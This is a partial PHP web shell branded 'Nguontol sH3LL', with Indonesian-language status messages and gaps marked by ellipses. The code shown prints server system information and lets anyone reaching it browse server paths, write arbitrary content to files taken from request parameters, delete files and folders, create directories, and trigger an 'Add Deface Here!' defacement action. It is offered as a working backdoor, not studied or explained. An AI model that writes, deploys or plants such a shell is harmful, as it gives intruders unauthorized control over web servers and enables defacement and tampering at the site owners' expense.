...
$defacepage = '';
...
echo '</head>
<body><b>
<H1><center><font color="white">Nguontol sH3LL</font> <font color="white">- By RzkyO</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font color="Aqua"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ Path : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="green">Sukses jon! </font><br />';
}else{
echo '<font color="red">Kurang ganteng, gagal! </font><br />';
}
...
echo '<font color="green">Asik Berhasil [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Kurang ibadah, gagal!</font><br />';
}
fclose($fp);
}
...
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Sukses bous! </font><br />';
}else{
echo '<font color="red">Gagal asw! </font><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
...
if(rmdir($patc)){
echo '<font color="green">Terhapus</font><br />';
}else{
echo '<font color="red#">Gagal bcs u noob</font><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
...
if(!mkdir($new)){
echo '<font color="red">Hahaha gagal</font><br />';
}else{
echo '<font color="green">Hoki ente, sukses</font><br />';
}
}
//Delete file
...
<tr>
<th class=th_home style="background:black;color:aqua;"><center>Name</center></th>
<th class=th_home style="background:black;color:aqua;" ><center>Size</center></th>
<th class=th_home style="background:black;color:aqua;" ><center>Perm</center></th>
<th class=th_home style="background:black;color:aqua;" ><center>Options</center></th>
</tr> <tr>
...
echo "<tr><hr>\r\n\t<center><form action='' method='POST'><input type='submit' name='defacepage' value='Add Deface Here!'></form></center><hr></tr></div></body></html>";
